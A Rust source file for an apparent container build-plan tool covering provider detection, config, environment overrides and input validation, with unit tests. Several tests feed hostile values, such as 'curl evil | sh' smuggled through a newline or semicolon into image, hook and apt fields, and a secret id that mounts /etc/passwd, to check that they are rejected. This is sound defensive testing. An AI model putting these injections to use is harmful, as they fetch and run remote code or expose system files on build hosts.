use std::path::{Path, PathBuf};

use crate::error::{Error, Result};
use crate::plan::BuildPlan;
use crate::providers;

/// User-supplied overrides that take precedence over a provider's auto-detected
/// build steps, for setups auto-detect cannot handle (all optional; `None`
/// leaves the detected value in place).
#[derive(Debug, Default, Clone)]
pub struct BuildOverrides {
    /// Force a provider instead of auto-detecting (e.g. "node"|"go"|"python").
    pub provider: Option<String>,
    /// Runtime version for the base image, when the provider supports it.
    pub version: Option<String>,
    /// Force a package manager (e.g. "npm"|"pnpm"|"yarn"|"bun") instead of
    /// lockfile sniffing.
    pub package_manager: Option<String>,
    /// Replace the dependency-install command.
    pub install_command: Option<String>,
    /// Replace the build command (also forces a build stage when set).
    pub build_command: Option<String>,
    /// Replace the runtime start command.
    pub start_command: Option<String>,
    /// Override the port the application listens on.
    pub port: Option<u16>,
    /// Environment variables to set in the runtime image.
    pub env: std::collections::BTreeMap<String, String>,
    /// Apt packages to install in the build stage.
    pub build_apt_packages: Vec<String>,
    /// Apt packages to install in the final runtime image.
    pub deploy_apt_packages: Vec<String>,
    /// Override the base image of the final runtime stage.
    pub runtime_image: Option<String>,
    /// Override the base image of the first build stage.
    pub build_image: Option<String>,
    /// Directories to prepend to `PATH` in the runtime image.
    pub paths: Vec<String>,
    /// `BuildKit` secret ids to expose to build-stage commands.
    pub secrets: Vec<String>,
    /// Commands to run at the start of the build stage, before provider steps.
    pub pre_build: Vec<String>,
    /// Commands to run at the end of the build stage, after provider steps.
    pub post_build: Vec<String>,
}

impl BuildOverrides {
    /// Fill this override's unset fields from `lower`, a lower-precedence source.
    /// Fields already set on `self` win; `None` scalars and empty collections are
    /// filled from `lower`. Used to layer CLI flags over environment variables.
    #[must_use]
    pub fn or(mut self, lower: Self) -> Self {
        self.provider = self.provider.or(lower.provider);
        self.version = self.version.or(lower.version);
        self.package_manager = self.package_manager.or(lower.package_manager);
        self.install_command = self.install_command.or(lower.install_command);
        self.build_command = self.build_command.or(lower.build_command);
        self.start_command = self.start_command.or(lower.start_command);
        self.port = self.port.or(lower.port);
        if self.env.is_empty() {
            self.env = lower.env;
        }
        if self.build_apt_packages.is_empty() {
            self.build_apt_packages = lower.build_apt_packages;
        }
        if self.deploy_apt_packages.is_empty() {
            self.deploy_apt_packages = lower.deploy_apt_packages;
        }
        self.runtime_image = self.runtime_image.or(lower.runtime_image);
        self.build_image = self.build_image.or(lower.build_image);
        if self.paths.is_empty() {
            self.paths = lower.paths;
        }
        if self.secrets.is_empty() {
            self.secrets = lower.secrets;
        }
        if self.pre_build.is_empty() {
            self.pre_build = lower.pre_build;
        }
        if self.post_build.is_empty() {
            self.post_build = lower.post_build;
        }
        self
    }

    /// Build overrides from `KILN_*` variables, reading each name through `get`.
    /// A missing or blank value leaves the field unset. Package lists are
    /// whitespace-separated. This is the injectable core of [`Self::from_env`].
    #[must_use]
    pub fn from_env_with(get: impl Fn(&str) -> Option<String>) -> Self {
        let get = |key: &str| get(key).filter(|value| !value.trim().is_empty());
        let split = |value: String| value.split_whitespace().map(str::to_string).collect::<Vec<_>>();
        Self {
            provider: get("KILN_PROVIDER"),
            version: get("KILN_VERSION"),
            package_manager: get("KILN_PACKAGE_MANAGER"),
            install_command: get("KILN_INSTALL_CMD"),
            build_command: get("KILN_BUILD_CMD"),
            start_command: get("KILN_START_CMD"),
            port: get("KILN_PORT").and_then(|value| value.trim().parse().ok()),
            env: std::collections::BTreeMap::new(),
            build_apt_packages: get("KILN_BUILD_APT_PACKAGES").map(split).unwrap_or_default(),
            deploy_apt_packages: get("KILN_DEPLOY_APT_PACKAGES").map(split).unwrap_or_default(),
            runtime_image: get("KILN_RUNTIME_IMAGE"),
            build_image: get("KILN_BUILD_IMAGE"),
            paths: get("KILN_PATHS").map(split).unwrap_or_default(),
            secrets: get("KILN_SECRETS").map(split).unwrap_or_default(),
            // Build hooks are multi-command and expressed in the config file, not
            // via environment variables.
            pre_build: Vec::new(),
            post_build: Vec::new(),
        }
    }

    /// Build overrides from the process's `KILN_*` environment variables, so a
    /// platform can steer a build without a committed config file.
    #[must_use]
    pub fn from_env() -> Self {
        Self::from_env_with(|key| std::env::var(key).ok())
    }
}

/// Context for a project being analyzed.
#[derive(Debug)]
pub struct AppContext {
    /// Root path of the project
    pub root: PathBuf,
    /// User-supplied build-step overrides (empty by default).
    pub overrides: BuildOverrides,
}

impl AppContext {
    /// Create a new app context rooted at the given path.
    ///
    /// # Errors
    ///
    /// Returns an error if the path does not exist.
    pub fn new(root: impl Into<PathBuf>) -> Result<Self> {
        Self::with_overrides(root, BuildOverrides::default())
    }

    /// Create a context with build-step overrides.
    ///
    /// # Errors
    ///
    /// Returns an error if the path does not exist.
    pub fn with_overrides(root: impl Into<PathBuf>, overrides: BuildOverrides) -> Result<Self> {
        let root = root.into();
        if !root.exists() {
            return Err(Error::ReadFile {
                path: root,
                source: std::io::Error::new(std::io::ErrorKind::NotFound, "path does not exist"),
            });
        }
        Ok(Self { root, overrides })
    }

    /// Check if a file exists relative to the project root.
    #[must_use]
    pub fn has_file(&self, name: &str) -> bool {
        self.root.join(name).is_file()
    }

    /// Read a file relative to the project root.
    ///
    /// # Errors
    ///
    /// Returns an error if the file cannot be read.
    pub fn read_file(&self, name: &str) -> Result<String> {
        let path = self.root.join(name);
        std::fs::read_to_string(&path).map_err(|e| Error::ReadFile { path, source: e })
    }

    /// List files in a directory relative to the project root.
    #[must_use]
    pub fn list_files(&self, dir: &str) -> Vec<PathBuf> {
        let path = self.root.join(dir);
        std::fs::read_dir(&path)
            .ok()
            .map(|entries| entries.filter_map(std::result::Result::ok).map(|e| e.path()).collect())
            .unwrap_or_default()
    }

    /// Check if any file with the given extension exists in the root.
    #[must_use]
    pub fn has_file_with_extension(&self, ext: &str) -> bool {
        self.list_files(".")
            .iter()
            .any(|p| p.extension().is_some_and(|e| e == ext))
    }
}

/// Detect the project language and generate a build plan.
///
/// Tries each registered provider in priority order and returns
/// the plan from the first matching provider.
///
/// # Errors
///
/// Returns `NoProviderDetected` if no provider matches.
pub fn detect_and_plan(root: impl AsRef<Path>) -> Result<BuildPlan> {
    detect_and_plan_with(root, BuildOverrides::default())
}

/// Detect the project language and generate a build plan, applying
/// user-supplied build-step overrides.
///
/// # Errors
///
/// Returns `NoProviderDetected` if no provider matches.
pub fn detect_and_plan_with(root: impl AsRef<Path>, overrides: BuildOverrides) -> Result<BuildPlan> {
    let root = root.as_ref();

    // A kiln.json / kiln.toml fills any field the caller (CLI) left unset, so an
    // explicit flag always wins over the config file.
    let overrides = match crate::config::KilnConfig::load(root)? {
        Some(config) => config.merge_into(overrides),
        None => overrides,
    };

    let forced_provider = overrides.provider.clone();
    let port_override = overrides.port;
    let env = overrides.env.clone();
    let build_apt = overrides.build_apt_packages.clone();
    let deploy_apt = overrides.deploy_apt_packages.clone();
    let runtime_image = overrides.runtime_image.clone();
    let build_image = overrides.build_image.clone();
    let paths = overrides.paths.clone();
    let secrets = overrides.secrets.clone();
    let pre_build = overrides.pre_build.clone();
    let post_build = overrides.post_build.clone();
    let ctx = AppContext::with_overrides(root, overrides)?;

    let mut plan = if let Some(name) = forced_provider {
        let provider = providers::all()
            .into_iter()
            .find(|p| p.name() == name)
            .ok_or_else(|| Error::Provider(format!("unknown provider: {name}")))?;
        tracing::info!(provider = provider.name(), "using configured provider");
        provider.plan(&ctx)?
    } else {
        let mut plan = None;
        for provider in providers::all() {
            if provider.detect(&ctx) {
                tracing::info!(provider = provider.name(), "detected project language");
                plan = Some(provider.plan(&ctx)?);
                break;
            }
        }
        plan.ok_or_else(|| Error::NoProviderDetected(ctx.root.clone()))?
    };

    if let Some(port) = port_override {
        plan.port = Some(port);
    }
    plan.env = env;
    // Hooks first, then apt: apt is inserted at the front, so it lands ahead of
    // any pre-build hook, giving the build order [apt, pre_build, provider, post_build].
    apply_build_hooks(&mut plan, &pre_build, &post_build)?;
    apply_apt_packages(&mut plan, &build_apt, &deploy_apt)?;
    apply_base_images(&mut plan, build_image, runtime_image)?;
    for path in &paths {
        crate::sanitize::validate_token("PATH entry", path)?;
    }
    plan.paths = paths;
    for secret in &secrets {
        crate::sanitize::validate_secret_id(secret)?;
    }
    plan.secrets = secrets;

    Ok(plan)
}

/// Insert user build hooks into the first stage: `pre` commands run before the
/// provider's own steps, `post` commands after. Each becomes its own `RUN` line.
/// A command may not be blank or contain a newline, which would split the line.
fn apply_build_hooks(plan: &mut BuildPlan, pre: &[String], post: &[String]) -> Result<()> {
    if pre.is_empty() && post.is_empty() {
        return Ok(());
    }
    for command in pre.iter().chain(post) {
        if command.trim().is_empty() || command.contains(['\n', '\r']) {
            return Err(Error::UnsafeValue {
                field: "build hook command",
                value: command.clone(),
            });
        }
    }
    let hook = |command: &String| crate::plan::Command {
        run: command.clone(),
        cache_mounts: Vec::new(),
    };
    if let Some(stage) = plan.stages.first_mut() {
        for (offset, command) in pre.iter().enumerate() {
            stage.commands.insert(offset, hook(command));
        }
        for command in post {
            stage.commands.push(hook(command));
        }
    }
    Ok(())
}

/// Override the build and/or runtime stage base images with validated refs.
/// The build image applies to the first stage, the runtime image to the last.
fn apply_base_images(plan: &mut BuildPlan, build_image: Option<String>, runtime_image: Option<String>) -> Result<()> {
    if let Some(image) = build_image {
        crate::sanitize::validate_image_ref(&image)?;
        if let Some(stage) = plan.stages.first_mut() {
            stage.base_image = image;
        }
    }
    if let Some(image) = runtime_image {
        crate::sanitize::validate_image_ref(&image)?;
        if let Some(stage) = plan.stages.last_mut() {
            stage.base_image = image;
        }
    }
    Ok(())
}

/// Install user-requested apt packages: build packages in the first stage,
/// runtime packages in the last stage. Each is validated, then prepended as a
/// single `apt-get install` step so it layers ahead of the provider's own build
/// commands. A no-op when both lists are empty.
fn apply_apt_packages(plan: &mut BuildPlan, build: &[String], deploy: &[String]) -> Result<()> {
    if !build.is_empty() {
        let command = apt_command(build)?;
        if let Some(stage) = plan.stages.first_mut() {
            stage.commands.insert(0, command);
        }
    }
    if !deploy.is_empty() {
        let command = apt_command(deploy)?;
        if let Some(stage) = plan.stages.last_mut() {
            stage.commands.insert(0, command);
        }
    }
    Ok(())
}

/// Build the validated `apt-get install` command for a package list. `update`
/// and `rm -rf /var/lib/apt/lists/*` bracket the install so the layer is
/// self-contained and leaves no apt index behind.
fn apt_command(packages: &[String]) -> Result<crate::plan::Command> {
    for package in packages {
        crate::sanitize::validate_apt_package(package)?;
    }
    let list = packages.join(" ");
    Ok(crate::plan::Command {
        run: format!(
            "apt-get update && apt-get install -y --no-install-recommends {list} && rm -rf /var/lib/apt/lists/*"
        ),
        cache_mounts: vec!["/var/cache/apt".to_string()],
    })
}

/// Detect the project language without generating a plan.
///
/// Returns the provider name if detected.
///
/// # Errors
///
/// Returns an error if the project root does not exist.
pub fn detect(root: impl AsRef<Path>) -> Result<Option<String>> {
    let ctx = AppContext::new(root.as_ref())?;

    for provider in providers::all() {
        if provider.detect(&ctx) {
            return Ok(Some(provider.name().to_string()));
        }
    }

    Ok(None)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn config_forces_provider_over_detection() {
        // a repo with BOTH go.mod and package.json; config forces node
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
        std::fs::write(dir.path().join("package.json"), r#"{"name":"t","main":"index.js"}"#).unwrap();
        std::fs::write(dir.path().join("kiln.json"), r#"{"provider":"node"}"#).unwrap();
        let plan = detect_and_plan(dir.path()).unwrap();
        assert_eq!(plan.provider, "node");
    }

    #[test]
    fn config_applies_port_and_env() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
        std::fs::write(
            dir.path().join("kiln.json"),
            r#"{"port":9000,"env":{"LOG_LEVEL":"debug"}}"#,
        )
        .unwrap();
        let plan = detect_and_plan(dir.path()).unwrap();
        assert_eq!(plan.port, Some(9000));
        assert_eq!(plan.env.get("LOG_LEVEL").map(String::as_str), Some("debug"));
    }

    #[test]
    fn unknown_configured_provider_errors() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
        std::fs::write(dir.path().join("kiln.json"), r#"{"provider":"cobol"}"#).unwrap();
        assert!(detect_and_plan(dir.path()).is_err());
    }

    #[test]
    fn config_installs_build_and_deploy_apt_packages() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
        std::fs::write(
            dir.path().join("kiln.json"),
            r#"{"build_apt_packages":["libpq-dev","pkg-config"],"deploy_apt_packages":["ca-certificates"]}"#,
        )
        .unwrap();
        let plan = detect_and_plan(dir.path()).unwrap();

        // build packages land as the first command of the first (build) stage
        let build_cmd = &plan.stages.first().unwrap().commands[0].run;
        assert!(
            build_cmd.contains("apt-get install -y --no-install-recommends libpq-dev pkg-config"),
            "{build_cmd}"
        );

        // deploy packages land as the first command of the last (runtime) stage
        let deploy_cmd = &plan.stages.last().unwrap().commands[0].run;
        assert!(
            deploy_cmd.contains("apt-get install -y --no-install-recommends ca-certificates"),
            "{deploy_cmd}"
        );
    }

    #[test]
    fn apt_install_precedes_the_providers_own_build_command() {
        // go's build stage runs `go build`; the apt step must be inserted ahead
        // of it so system deps exist before the build runs.
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
        std::fs::write(dir.path().join("kiln.json"), r#"{"build_apt_packages":["gcc"]}"#).unwrap();
        let plan = detect_and_plan(dir.path()).unwrap();
        let cmds = &plan.stages.first().unwrap().commands;
        assert!(cmds[0].run.contains("apt-get install"));
        assert!(cmds.iter().skip(1).any(|c| c.run.contains("go build")));
    }

    #[test]
    fn from_env_parses_all_kiln_vars() {
        let vars: std::collections::HashMap<&str, &str> = [
            ("KILN_PROVIDER", "node"),
            ("KILN_VERSION", "20"),
            ("KILN_PACKAGE_MANAGER", "pnpm"),
            ("KILN_INSTALL_CMD", "pnpm install"),
            ("KILN_BUILD_CMD", "pnpm build"),
            ("KILN_START_CMD", "node dist/main.js"),
            ("KILN_PORT", "4000"),
            ("KILN_BUILD_APT_PACKAGES", "gcc  libpq-dev"),
            ("KILN_DEPLOY_APT_PACKAGES", "ca-certificates"),
        ]
        .into_iter()
        .collect();
        let o = BuildOverrides::from_env_with(|k| vars.get(k).map(|s| (*s).to_string()));
        assert_eq!(o.provider.as_deref(), Some("node"));
        assert_eq!(o.version.as_deref(), Some("20"));
        assert_eq!(o.package_manager.as_deref(), Some("pnpm"));
        assert_eq!(o.install_command.as_deref(), Some("pnpm install"));
        assert_eq!(o.build_command.as_deref(), Some("pnpm build"));
        assert_eq!(o.start_command.as_deref(), Some("node dist/main.js"));
        assert_eq!(o.port, Some(4000));
        assert_eq!(o.build_apt_packages, vec!["gcc", "libpq-dev"]);
        assert_eq!(o.deploy_apt_packages, vec!["ca-certificates"]);
    }

    #[test]
    fn from_env_treats_blank_as_unset() {
        let o = BuildOverrides::from_env_with(|k| (k == "KILN_PROVIDER").then(|| "   ".to_string()));
        assert!(o.provider.is_none());
        assert!(o.port.is_none());
    }

    #[test]
    fn cli_flags_win_over_env() {
        let cli = BuildOverrides {
            version: Some("22".to_string()),
            ..Default::default()
        };
        let env = BuildOverrides {
            version: Some("20".to_string()),
            provider: Some("node".to_string()),
            ..Default::default()
        };
        let merged = cli.or(env);
        assert_eq!(merged.version.as_deref(), Some("22"), "CLI version wins");
        assert_eq!(merged.provider.as_deref(), Some("node"), "env fills the gap");
    }

    #[test]
    fn config_overrides_base_images_and_paths() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
        std::fs::write(
            dir.path().join("kiln.json"),
            r#"{"build_image":"golang:1.23-bookworm","runtime_image":"gcr.io/distroless/base-debian12","paths":["/opt/bin","/usr/local/app/bin"]}"#,
        )
        .unwrap();
        let plan = detect_and_plan(dir.path()).unwrap();
        assert_eq!(plan.stages.first().unwrap().base_image, "golang:1.23-bookworm");
        assert_eq!(
            plan.stages.last().unwrap().base_image,
            "gcr.io/distroless/base-debian12"
        );
        assert_eq!(plan.paths, vec!["/opt/bin", "/usr/local/app/bin"]);

        let dockerfile = crate::dockerfile::generate(&plan);
        assert!(
            dockerfile.contains("ENV PATH=\"/opt/bin:/usr/local/app/bin:$PATH\""),
            "{dockerfile}"
        );
    }

    #[test]
    fn malicious_base_image_is_rejected() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
        std::fs::write(
            dir.path().join("kiln.json"),
            r#"{"runtime_image":"img\nRUN curl evil | sh"}"#,
        )
        .unwrap();
        assert!(detect_and_plan(dir.path()).is_err());
    }

    #[test]
    fn build_hooks_run_before_and_after_provider_steps() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
        std::fs::write(
            dir.path().join("kiln.json"),
            r#"{"pre_build":["echo pre","protoc gen"],"post_build":["strip /bin/app"]}"#,
        )
        .unwrap();
        let plan = detect_and_plan(dir.path()).unwrap();
        let runs: Vec<&str> = plan
            .stages
            .first()
            .unwrap()
            .commands
            .iter()
            .map(|c| c.run.as_str())
            .collect();

        let pre = runs.iter().position(|r| r.contains("echo pre")).unwrap();
        let build = runs.iter().position(|r| r.contains("go build")).unwrap();
        let post = runs.iter().position(|r| r.contains("strip /bin/app")).unwrap();
        assert!(pre < build, "pre_build runs before the provider build: {runs:?}");
        assert!(build < post, "post_build runs after the provider build: {runs:?}");
        // hooks preserve their given order
        assert!(runs.iter().position(|r| r.contains("protoc gen")).unwrap() > pre);
    }

    #[test]
    fn build_hook_with_newline_is_rejected() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
        std::fs::write(
            dir.path().join("kiln.json"),
            "{\"pre_build\":[\"echo a\\nRUN curl evil | sh\"]}",
        )
        .unwrap();
        assert!(detect_and_plan(dir.path()).is_err());
    }

    #[test]
    fn config_mounts_secrets_on_the_build_stage() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
        std::fs::write(dir.path().join("kiln.json"), r#"{"secrets":["NPM_TOKEN"]}"#).unwrap();
        let plan = detect_and_plan(dir.path()).unwrap();
        assert_eq!(plan.secrets, vec!["NPM_TOKEN"]);

        let dockerfile = crate::dockerfile::generate(&plan);
        // the build stage's RUN carries the secret mount; the runtime stage does not
        assert!(dockerfile.contains("--mount=type=secret,id=NPM_TOKEN"), "{dockerfile}");
        let secret_lines = dockerfile.matches("id=NPM_TOKEN").count();
        assert_eq!(secret_lines, 1, "secret mounts only build-stage commands: {dockerfile}");
    }

    #[test]
    fn malicious_secret_id_is_rejected() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
        std::fs::write(dir.path().join("kiln.json"), r#"{"secrets":["a,src=/etc/passwd"]}"#).unwrap();
        assert!(detect_and_plan(dir.path()).is_err());
    }

    #[test]
    fn malicious_apt_package_is_rejected() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
        std::fs::write(
            dir.path().join("kiln.json"),
            r#"{"build_apt_packages":["ok; curl evil | sh"]}"#,
        )
        .unwrap();
        assert!(
            detect_and_plan(dir.path()).is_err(),
            "shell metachars in a package must be rejected"
        );
    }
}
